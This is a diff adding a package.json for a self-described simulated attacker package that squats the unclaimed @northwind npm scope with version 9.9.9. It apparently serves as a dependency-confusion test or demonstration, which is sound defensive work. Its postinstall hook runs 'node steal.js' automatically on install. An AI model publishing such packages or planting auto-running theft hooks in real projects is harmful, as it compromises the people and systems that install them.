@@ -1,0 +1,9 @@
+{
+  "name": "@northwind/metrics-core",
+  "version": "9.9.9",
+  "description": "SIMULATED attacker package squatting the unclaimed @northwind scope on public npm",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node steal.js"
+  }
+}
